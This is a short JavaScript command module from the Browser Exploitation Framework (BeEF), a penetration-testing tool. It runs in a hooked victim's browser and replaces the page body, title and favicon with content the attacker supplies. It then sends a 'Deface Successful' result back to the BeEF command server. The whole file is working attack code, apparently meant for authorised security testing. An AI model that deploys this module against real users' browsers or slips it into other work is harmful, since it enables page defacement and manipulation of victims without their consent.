//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	document.body.innerHTML = "<%= @deface_content %>";
	document.title = "<%= @deface_title %>";
	beef.browser.changeFavicon("<%= @deface_favicon %>");

    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Deface Successful");
});
